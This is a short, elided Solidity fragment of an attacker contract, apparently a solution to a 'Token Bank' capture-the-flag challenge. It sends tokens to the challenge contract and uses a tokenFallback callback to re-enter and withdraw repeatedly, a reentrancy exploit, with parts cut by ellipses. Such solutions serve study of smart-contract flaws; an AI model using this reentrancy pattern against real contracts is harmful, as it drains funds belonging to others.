...
contract TokenBankAttacker {
    ...
    function exploit() public {
        challenge.token().transfer(address(challenge), 500000 ether);
    ...
    function tokenFallback(
        ...
        if(from != address(challenge) || balance == 0){
            return;
        }

        uint256 challengeBalance = challenge.token().balanceOf(address(challenge));
        if(challengeBalance != 0){
            uint256 withdrawAmount = challengeBalance >= balance ? balance : challengeBalance;
